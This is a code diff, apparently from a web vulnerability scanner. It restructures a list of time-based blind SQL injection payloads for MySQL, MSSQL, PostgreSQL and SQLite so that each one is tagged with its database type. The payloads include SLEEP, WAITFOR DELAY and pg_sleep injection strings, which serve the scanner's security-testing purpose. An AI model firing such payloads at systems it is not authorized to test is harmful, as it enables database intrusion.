@@ -16,19 +16,24 @@ export const SQLI_PAYLOADS = [
   "' UNION SELECT NULL--",
 ];
 
+export interface TimedSqliPayload {
+  payload: string;
+  dbType: 'mysql' | 'mssql' | 'postgres' | 'sqlite' | 'generic';
+}
+
 /** Time-based blind SQLi payloads — separated so we can measure response timing.
  *  Uses 5-second delays to reliably exceed BLIND_SQLI_THRESHOLD_MS (3500ms)
  *  while leaving 1.5s margin for network latency. */
-export const SQLI_TIME_PAYLOADS = [
+export const SQLI_TIME_PAYLOADS: TimedSqliPayload[] = [
   // MySQL
-  "' OR SLEEP(5)--",
-  "1 OR SLEEP(5)--",
+  { payload: "' OR SLEEP(5)--", dbType: 'mysql' },
+  { payload: "1 OR SLEEP(5)--", dbType: 'mysql' },
   // MSSQL
-  "1; WAITFOR DELAY '0:0:5'--",
+  { payload: "1; WAITFOR DELAY '0:0:5'--", dbType: 'mssql' },
   // PostgreSQL
-  "'; SELECT pg_sleep(5)--",
+  { payload: "'; SELECT pg_sleep(5)--", dbType: 'postgres' },
   // SQLite (no sleep, but heavy computation)
-  "1 OR 1=1 AND RANDOMBLOB(500000000)--",
+  { payload: "1 OR 1=1 AND RANDOMBLOB(500000000)--", dbType: 'sqlite' },
 ];
 
 /** SQL error signatures indicating injection vulnerability */
